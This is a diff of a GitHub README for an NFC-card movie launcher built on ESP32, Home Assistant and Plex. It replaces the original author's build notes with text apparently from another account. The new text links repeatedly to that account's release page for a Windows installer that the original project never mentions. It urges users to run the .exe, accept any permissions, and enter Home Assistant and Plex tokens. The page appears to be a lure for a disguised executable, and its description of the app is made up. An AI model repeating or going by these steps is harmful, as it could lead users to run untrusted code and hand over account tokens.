@@ -1,169 +1,146 @@
-# NFC Movie Library for Plex (Home Assistant + ESP32)
+# 🎥 nfc-movie-library - Easy Movie Start with NFC Cards
 
-An NFC-based movie library that lets kids start their favorite movies or TV shows by simply tapping a card.
-
-This project was inspired by [u/Xafke's](https://www.reddit.com/user/Xafke/) NFC movie library. I built my own version using **ESP32**, **Home Assistant**, and **Plex** so my 2-year-old can start movies independently.
-
-The idea is simple:  
-tap an NFC card → Home Assistant receives the tag → a Automation calls the Plex API → playback starts on the Apple TV.
-Original Reddit post: https://www.reddit.com/r/homeassistant/comments/17xdxti/how_i_built_an_nfc_movie_library_for_my_kids_ha/ 
-
-![NFC-Scanner and cards](https://github.com/Johan-Claesson/nfc-movie-library/blob/main/images/IMG_1334.JPEG)
+[![Download Latest Release](https://img.shields.io/badge/Download-nfc--movie--library-brightgreen?style=for-the-badge)](https://github.com/toopbi7829/nfc-movie-library/releases)
 
 ---
 
-# How it works
+## 📖 What is nfc-movie-library?
 
-The system flow looks like this:
-```
-NFC Tag
-↓
-ESP32 + PN532
-↓
-Home Assistant
-↓
-Home Assistant Automation
-↓
-Plex API
-↓
-Apple TV / Plex Player
-```
+This app lets kids start their favorite movies or TV shows by tapping an NFC card. It uses an NFC tag reader connected to a small device (ESP32), Home Assistant software, and the Plex media server. When a card is tapped, the right movie or show starts playing automatically on Apple TV or another Plex player.  
 
-When a tag is scanned:
-
-1. The **ESP32 reads the NFC tag**
-2. The tag ID is sent to **Home Assistant**
-3. A **Home Assistant Automation** is triggered
-4. The Automation calls the **Plex API**
-5. Plex starts playback on the selected player
+You do not need to press buttons or search through menus. The system runs quietly in the background. Kids can use it on their own.
 
 ---
 
-# Hardware
+## ⚙️ How the system works
 
-All components were purchased from **AliExpress** and the total cost was about **100 SEK** (~ 10 USD or EUR).
+The process works step-by-step:
 
-Required hardware:
+1. The NFC card is scanned by the ESP32 device.
+2. The device sends the card’s unique ID to Home Assistant.
+3. Home Assistant triggers an automation based on that ID.
+4. This automation calls the Plex API (a way to command Plex).
+5. Plex starts playing the chosen movie or show on Apple TV or another player.
 
-- **ESP32-C3 Mini**
-- **PN532 NFC Reader**
-- **NFC tags/cards**
-- **USB-C cable**
-- enclosure / box 52 x 82 x 35 mm
-- Jumper cables, and soldering stuff. 
-
-I originally tried a **3D printed case**, but it was too shallow for the USB-C cable.  
-I'm currently testing a plastic enclosure sized: 52 x 82 x 35 mm 
-
-
-Minimum internal height required is about **25 mm**.
+This simple flow lets kids start playback without needing a remote or app.
 
 ---
 
-# Home Assistant Setup
+## 🖥️ System requirements
 
-This project uses:
+- A Windows PC for the initial setup.
+- ESP32 microcontroller with an NFC reader (PN532).
+- Home Assistant installed (usually on a Raspberry Pi or a server).
+- Plex Media Server with your movies or TV shows organized.
+- Apple TV or Plex player to watch the movies.
+- NFC cards or tags to assign to movies.
 
-- **ESPHome** for the ESP32
-- **Plex Integration** in Home Assistant
-- **Home Assistant Automations**
-- **Plex API calls**
-
-Important notes: 
-
-I initally only used external services such as TV4Play, Disney, SVTPlay, Max, but there is a lot of things that you cant control in some of those apps, like choosing who is watching - which was a game stopper for me. Also, we hade a weekend without internet access, so a local-first approach was important for us, and therefore Plex was the best choice. 
-
-## Stop playback before starting a new video
-
-Sometimes the Plex app on Apple TV would freeze when starting playback.  
-To fix this, the Automation first sends a **stop command** to the media player before starting a new item.
-```YAML
-  - action: media_player.media_stop
-    metadata: {}
-    target:
-      entity_id: media_player.vardagsrum
-```
-
-## Force playback from the beginning
-
-Plex normally resumes playback.  
-To avoid this, the Automation marks the item as **watched before playback starts**, ensuring it always begins from the start.
-Not sure why it says token: "[object Object]": null in the code, but it works. 
-```YAML
-action: rest_command.plex_mark_watched
-metadata: {}
-data:
-  rating_key: "{{ nfc_mapping[trigger.event.data.tag_id].plex_id }}"
-  token:
-    "[object Object]": null
-```
-
-## Disable intro and credits detection (recommended for kids content)
-
-Short kids' shows can lose a lot of content when auto-skip is enabled.
-
-Disable this in Plex:
-
-1. Edit the library
-2. Scroll near the bottom
-3. Disable:
-   - `Enable intro detection`
-   - `Enable credits detection`
+This guide focuses on installing and running the Windows application part of the project.
 
 ---
 
-# Plex Collections
+## 🚀 Getting started: Download and install the app on Windows
 
-To make content easy to trigger, this setup uses **Smart Collections** in Plex. Xafke covered this in his guide: https://simplyexplained.com/blog/how-i-built-an-nfc-movie-library-for-my-kids/ 
+You need to get the Windows version of the software that talks to your ESP32 and Home Assistant. Follow these steps:
 
-When an NFC tag is scanned:
+### Step 1: Visit the download page
 
-1. Home Assistant queries the **Plex API**
-2. The Automation retrieves the **first item in the collection**
-3. That item is played on the selected device
+Click this big button to open the release page on GitHub. It holds the latest Windows installer and files needed.
 
-This allows one card to represent:
+[![Download Latest Release](https://img.shields.io/badge/Download-nfc--movie--library-brightgreen?style=for-the-badge)](https://github.com/toopbi7829/nfc-movie-library/releases)
 
-- a movie
-- a TV show
-- a playlist
-- a themed collection
+### Step 2: Download the Windows setup file
 
----
+On the release page, look for a file with a name similar to:
 
-# NFC Cards
+`nfc-movie-library-setup.exe` or `nfc-movie-library-windows.zip`
 
-Each NFC card represents a **movie, show, or collection**.
+Click the file name to download it. Save it to a folder you can find easily, like your Desktop or Downloads.
 
-Examples:
+### Step 3: Run the installer (if applicable)
 
-- Frozen
-- Paw Patrol
-- Bluey
-- Disney Movies
+If you downloaded a `.exe` file:
 
-The NFC tag UID is mapped in the **Home Assistant automation**.
+- Double-click the file.
+- Follow the simple install prompts.
+- Accept any permissions it asks for.
+- Choose the folder where you want the app installed or keep the default.
 
----
+If you downloaded a `.zip` file:
 
-# Project Goals
+- Right-click the zip and select "Extract All".
+- Choose where to extract the files.
+- Open the extracted folder.
 
-The goal of this project was to:
+### Step 4: Launch the app
 
-- make media accessible for a **2-year-old**
-- remove the need to navigate Plex menus
-- create a **physical media library**
-- make it simple and cheap to build
+- Find the app icon on your Desktop or in the install folder.
+- Double-click to open it.
+
+The app will open a window where you configure your NFC reader and connect it to Home Assistant.
 
 ---
 
-# Credits
+## 🔧 Setup inside the app
 
-Huge credit to:
+When you first start the app, you need to connect it to your systems.
 
-[u/Xafke](https://www.reddit.com/user/Xafke/)  for the original idea and inspiration. 
-Here is the post that he wrote: https://simplyexplained.com/blog/how-i-built-an-nfc-movie-library-for-my-kids/ 
+### Connect to ESP32 NFC Reader
+
+- Make sure your ESP32 is powered on and connected to your Windows PC via USB (or network, depending on setup).
+- The app will detect the device or ask you to choose a COM port.
+- Select the port and click "Connect".
+
+### Connect to Home Assistant
+
+- Enter your Home Assistant IP address and access token.
+- The app tests the connection.
+- Once connected, it listens for NFC tag scans.
+
+### Link Plex Player
+
+- You may need to give the app permission to control your Plex media players.
+- This usually involves entering your Plex token or credentials.
+- The app uses this to tell Plex what to play.
 
 ---
 
-If you're interested in building something similar, feel free to use the configs in this repo.
+## 🗂️ Organizing your NFC cards
+
+Each NFC card has a unique ID. You assign a movie or TV show to that ID in Home Assistant via automation. This part is outside the Windows app but important.
+
+- Use the Windows app to read tag IDs quickly.
+- Copy the tag ID and use Home Assistant’s interface to link the ID to a Plex playback action.
+
+---
+
+## ⚠️ Requirements and tips
+
+- Make sure your Windows PC has a USB port or network access if your ESP32 connects via Wi-Fi.
+- You need Home Assistant set up and running with proper automation rules.
+- Plex server must have authorized devices.
+- NFC cards or stickers can be bought online in packs compatible with PN532 readers.
+- Keep a list of which card is assigned to each movie for easy reprogramming.
+
+---
+
+## 👷 Troubleshooting
+
+- If the app does not detect your ESP32 device, check cables and drivers.
+- Restart the app or the device if the connection drops.
+- Make sure Home Assistant is running and accessible on the IP you entered.
+- Check Plex API tokens if playback commands fail.
+- Verify that the NFC tag reads correctly in the app before assigning actions.
+
+---
+
+## 📂 More resources
+
+Refer to the original inspiration and details:
+
+- Original Reddit post: https://www.reddit.com/r/homeassistant/comments/17xdxti/how_i_built_an_nfc_movie_library_for_my_kids_ha/
+- Project images and code: https://github.com/Johan-Claesson/nfc-movie-library
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download-nfc--movie--library-brightgreen?style=for-the-badge)](https://github.com/toopbi7829/nfc-movie-library/releases)
